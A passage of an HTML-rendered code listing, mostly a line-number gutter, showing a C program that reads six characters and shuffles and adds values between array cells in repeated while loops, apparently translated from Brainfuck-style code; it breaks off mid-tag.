class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> mem[<span class="number">1000000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">5</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">6</span>]);</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">        mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">        mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">8</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">8</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">9</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">9</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">4</span>])&#123;</span><br><span class="line">        mem[<span class="number">4</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">4</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">4</span>])&#123;</span><br><span class="line">        mem[<span class="number">4</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">4</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">5</span>])&#123;</span><br><span class="line">        mem[<span class="number">5</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">11</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">5</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">5</span>])&#123;</span><br><span class="line">        mem[<span class="number">5</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">11</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">5</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">6</span>])&#123;</span><br><span class="line">        mem[<span class="number">6</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">12</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">6</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">6</span>])&#123;</span><br><span class="line">        mem[<span class="number">6</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">12</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">6</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">7</span>])&#123;</span><br><span class="line">        mem[<span class="number">7</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">13</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">        mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">13</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">8</span>])&#123;</span><br><span class="line">        mem[<span class="number">8</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">14</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">8</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">14</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">9</span>])&#123;</span><br><span class="line">        mem[<span class="number">9</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">15</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">9</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">15</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">10</span>])&#123;</span><br><span class="line">        mem[<span class="number">10</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">16</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">4</span>])&#123;</span><br><span class="line">        mem[<span class="number">4</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">16</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">4</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">11</span>])&#123;</span><br><span class="line">        mem[<span class="number">11</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">17</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">11</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">5</span>])&#123;</span><br><span class="line">        mem[<span class="number">5</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">17</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span 